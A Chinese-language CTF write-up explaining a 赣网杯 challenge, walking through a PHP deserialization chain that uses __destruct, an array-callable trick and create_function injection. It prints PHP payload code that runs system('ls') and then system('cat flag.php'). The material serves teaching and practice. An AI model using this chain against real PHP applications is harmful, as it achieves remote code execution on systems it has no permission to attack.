# CTF真题解析：P173：赣网杯CTF真题讲解

![](img/4cd962bc8465cd7ee7bf37135f6d0586_1.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_3.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_5.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_7.png)

在本节课中，我们将要学习如何分析并解决一道来自赣网杯CTF比赛的真题。我们将通过一个具体的PHP反序列化漏洞案例，详细讲解从代码审计到漏洞利用的完整过程，并学习如何利用`create_function`函数实现代码执行。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_9.png)

---

## 第一步：复制源代码

![](img/4cd962bc8465cd7ee7bf37135f6d0586_11.png)

首先，我们需要将目标题目的源代码复制到本地环境进行分析。以下是获取到的源代码：

![](img/4cd962bc8465cd7ee7bf37135f6d0586_13.png)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$path = $_GET['path'];
class FUNC {
    public $k;
    public $v;
    public $info;
    function __destruct() {
        unserialize($this->k)($this->v);
    }
}
class get_flag {
    public $code;
    public $action;
    function get_flag() {
        $a = $this->action;
        $a('', $this->code);
    }
}
unserialize($_GET[0]);
?>
```

![](img/4cd962bc8465cd7ee7bf37135f6d0586_15.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_17.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_19.png)

上一节我们介绍了题目背景和源代码，本节中我们来看看如何开始分析。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_21.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_23.png)

---

![](img/4cd962bc8465cd7ee7bf37135f6d0586_25.png)

## 第二步：注释掉与属性无关的内容

![](img/4cd962bc8465cd7ee7bf37135f6d0586_27.png)

反序列化攻击的核心是操作对象的属性值。因此，我们需要先过滤掉源代码中所有与属性操作无关的代码，以便更清晰地看到可利用的结构。

以下是需要注释掉的部分：

*   `error_reporting(0);`：设置错误报告，与属性无关。
*   `highlight_file(__FILE__);`：高亮显示文件，与属性无关。
*   `$path = $_GET[‘path’];`：获取GET参数，与属性无关。
*   类`FUNC`和`get_flag`中所有**方法（函数）**的具体实现代码，例如`__destruct`和`get_flag`方法体内部的逻辑。但**类名、属性声明、方法定义行（如`function __destruct()`）本身需要保留**，因为它们定义了结构。

经过注释后，核心结构如下：
```php
class FUNC {
    public $k;
    public $v;
    public $info;
    function __destruct() {
        // 方法体内容已注释，但此方法会被自动调用
    }
}
class get_flag {
    public $code;
    public $action;
    function get_flag() {
        // 方法体内容已注释
    }
}
// unserialize($_GET[0]); 此行保留，因为它是触发点
```

---

![](img/4cd962bc8465cd7ee7bf37135f6d0586_29.png)

## 第三步：分析代码逻辑与构造利用链

![](img/4cd962bc8465cd7ee7bf37135f6d0586_31.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_32.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_34.png)

现在我们已经梳理出清晰的结构，本节中我们来看看如何分析代码逻辑并构造攻击链。这是整个过程中最关键也最具挑战性的一步。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_36.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_38.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_40.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_42.png)

### 1. 寻找入口点
代码最后一行执行`unserialize($_GET[0])`，这意味着我们可以通过GET参数`0`传入序列化字符串，服务器会将其反序列化为对象。这是我们的攻击入口。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_44.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_45.png)

### 2. 分析`FUNC`类及其魔术方法
`FUNC`类中定义了`__destruct()`魔术方法。该方法会在对象被销毁时**自动调用**。其内部逻辑为：
`unserialize($this->k)($this->v);`
这行代码的执行顺序是：
1.  先执行`unserialize($this->k)`，将属性`$k`的值反序列化。
2.  将上一步的结果作为一个**函数或可调用对象**，并用`$this->v`作为参数进行调用。
**公式表示**：`[unserialize($k)]($v)`

![](img/4cd962bc8465cd7ee7bf37135f6d0586_47.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_49.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_50.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_52.png)

由于`$k`和`$v`都是我们可以控制的属性，这里就存在利用点。我们可以让`unserialize($this->k)`的结果变成一个数组，利用PHP的**数组调用特性**。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_54.png)

### 3. 理解数组调用特性
在PHP中，如果一个数组被加上括号`()`当作函数调用，且该数组满足特定格式，则会触发一个内部调用。
**代码描述**：
`$array = [$object, ‘methodName’];`
`$array();`
这等价于直接调用：`$object->methodName();`

![](img/4cd962bc8465cd7ee7bf37135f6d0586_56.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_57.png)

我们的目标就是让`unserialize($this->k)`的结果成为这样一个数组，从而调用指定对象的方法。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_59.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_61.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_63.png)

### 4. 分析`get_flag`类
我们计划让数组调用触发`get_flag`类中的`get_flag()`方法。查看该方法：
```php
function get_flag() {
    $a = $this->action;
    $a(‘’, $this->code);
}
```
这里将属性`$action`的值赋给`$a`，然后执行`$a(‘’, $this->code)`。这很像我们在调用`create_function(‘’, $this->code)`。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_65.png)

### 5. 利用`create_function`漏洞
`create_function`用于动态创建匿名函数。它存在一个经典漏洞：如果其第二个参数（函数体代码）中包含未闭合的`}`，会“逃逸”出函数定义，导致后续代码被直接执行。
**利用方式**：
我们让`$this->action = ‘create_function’`，并精心构造`$this->code`的值。
例如，令 `$this->code = “} // 你的恶意代码 //”`。
这样，`create_function`创建的函数体被提前闭合，后面的恶意代码就被当作普通PHP代码执行了。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_67.png)

![](img/4cd962bc8465cd7ee7bf37135f6d0586_69.png)

---

## 第四步：构造并生成攻击载荷

根据上一步的分析，我们现在来具体构造攻击所需的属性和对象。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_71.png)

### 1. 构造`get_flag`对象
首先，创建一个`get_flag`对象`$g`，并为其属性赋值，以实现`create_function`的漏洞利用。
```php
$g = new get_flag();
$g->action = ‘create_function’; // 触发动态函数创建
$g->code = “} system(‘ls’); //”; // 闭合函数体，注入系统命令`ls`
```

### 2. 构造`FUNC`对象
然后，创建一个`FUNC`对象`$f`。我们需要让它的`__destruct()`方法触发对`$g->get_flag()`的调用。
根据分析，需要让`unserialize($this->k)`等于数组`[$g, ‘get_flag’]`。
设 `unserialize($this->k) = [$g, ‘get_flag’]`。
两边同时进行`serialize`运算：`$this->k = serialize([$g, ‘get_flag’])`。
```php
$f = new FUNC();
$f->k = serialize([$g, ‘get_flag’]);
$f->v = ‘’; // $v作为参数传入，此处可为空
```

### 3. 生成最终序列化字符串
我们最终要传递的是`$f`对象的序列化字符串。
```php
$payload = serialize($f);
echo $payload;
```
由于序列化字符串可能包含特殊字符，在通过URL传递时需要进行编码。
```php
$payload_encoded = urlencode(serialize($f));
echo $payload_encoded;
```

---

## 第五步：发送载荷并获取Flag

最后一步，我们将生成的攻击载荷发送到目标服务器。

![](img/4cd962bc8465cd7ee7bf37135f6d0586_73.png)

1.  使用工具（如`hackbar`或`curl`）向目标URL发起GET请求。
2.  参数名为`0`，值为上一步生成的、经过URL编码的序列化字符串。
    **示例请求**：`http://target.com/vuln.php?0=O%3A4%3A%22FUNC%22...`
3.  服务器接收到参数后，会反序列化数据，触发对象销毁，进而执行我们构造的调用链，最终运行`system(‘ls’)`命令。
4.  在返回的页面中，我们看到了目录列表，发现存在`flag.php`文件。
5.  修改`get_flag`对象中的命令，将`ls`改为`cat flag.php`，重新生成载荷并发送。
    ```php
    $g->code = “} system(‘cat flag.php’); //”;
    ```
6.  发送新的请求，查看响应内容（有时flag可能在网页源代码中，需要查看源码），即可获得比赛的flag。

---

本节课中我们一起学习了CTF中PHP反序列化漏洞的完整利用流程。我们从源代码审计开始，逐步分析了`__destruct`魔术方法、数组调用特性以及`create_function`函数漏洞的利用方式，最终通过构造复杂的对象关系链，实现了远程代码执行并获取了目标flag。这道题综合性强，希望你能通过这个案例加深对反序列化漏洞的理解。